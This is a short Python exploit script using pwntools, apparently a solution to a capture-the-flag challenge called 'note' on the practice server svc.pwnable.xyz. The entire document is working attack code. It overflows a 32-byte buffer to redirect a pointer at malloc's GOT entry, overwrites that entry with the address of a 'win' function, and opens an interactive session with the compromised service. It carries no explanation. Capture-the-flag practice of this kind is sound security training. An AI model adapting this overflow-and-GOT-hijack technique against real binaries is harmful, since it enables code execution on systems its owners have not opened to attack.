from pwn import *
p = remote("svc.pwnable.xyz", 30016)
#p = process("./note")
elf = ELF("./note")
p.sendline("1")
sleep(0.1)
p.sendline("40")
sleep(0.1)
p.send("a" * 32 + p64(elf.got['malloc']))

p.sendline("2")
sleep(0.1)
p.sendline(p64(elf.symbols['win']))

p.sendline("1")
sleep(0.1)
p.interactive()
